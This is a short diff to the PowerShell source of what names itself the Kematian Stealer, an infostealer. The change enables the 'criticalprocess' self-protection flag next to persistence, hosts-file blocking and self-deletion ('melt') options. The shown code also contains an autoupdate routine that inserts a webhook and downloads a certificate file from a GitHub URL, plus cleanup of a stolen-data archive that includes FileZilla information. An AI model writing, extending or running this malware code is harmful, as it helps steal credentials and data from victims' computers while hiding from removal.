@@ -1,7 +1,7 @@
 $debug = $false
 $autoupdate = $false
 $blockhostsfile = $true
-$criticalprocess = $false
+$criticalprocess = $true
 $melt = $true
 $fakeerror = $false
 $persistence = $true
@@ -44,7 +44,7 @@ function AUTOUPDATE {
         $updateandrun -replace "YOUR_WEBHOOK_HERE", $webhook | Out-File -FilePath $pscommandpath -Encoding ASCII
         $url = "https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/Kematian.pfx"
         $outputPath = "$env:tmp\Kematian.pfx"
-		if (Test-Path $outputPath) {Remove-Item $outputPath -Force}
+	if (Test-Path $outputPath) {Remove-Item $outputPath -Force}
         Invoke-WebRequest -Uri $url -OutFile $outputPath 
         $certificatePath = $outputPath
         $certificatePassword = ConvertTo-SecureString -String "Kematian" -AsPlainText -Force
@@ -1114,7 +1114,7 @@ FileZilla: $filezilla_info
 	# cleanup
     Remove-Item "$env:LOCALAPPDATA\Temp\Kematian.zip" -Force
     Remove-Item "$folder_general" -Force -Recurse
-	Remove-Item "$env:tmp\Kematian.pfx" -Force 
+    Remove-Item "$env:tmp\Kematian.pfx" -Force 
 }
 
 function Invoke-TASKS {
